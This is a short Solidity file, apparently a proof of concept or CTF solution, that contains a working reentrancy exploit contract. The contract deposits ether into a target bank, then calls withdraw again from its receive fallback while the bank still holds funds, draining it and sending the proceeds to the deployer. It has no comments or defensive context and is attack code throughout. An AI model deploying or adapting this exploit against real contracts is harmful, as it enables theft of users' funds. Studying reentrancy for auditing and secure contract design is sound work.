// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Exploit {
    address public target;
    address public owner;
    uint256 public amt;

    constructor(address _target) payable {
        target = _target;
        owner = msg.sender;
    }

    function attack() external {
        amt = address(this).balance;
        IBank(target).deposit{value: amt}();
        IBank(target).withdraw();
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "payout failed");
    }

    receive() external payable {
        if (target.balance >= amt && amt > 0) {
            IBank(target).withdraw();
        }
    }
}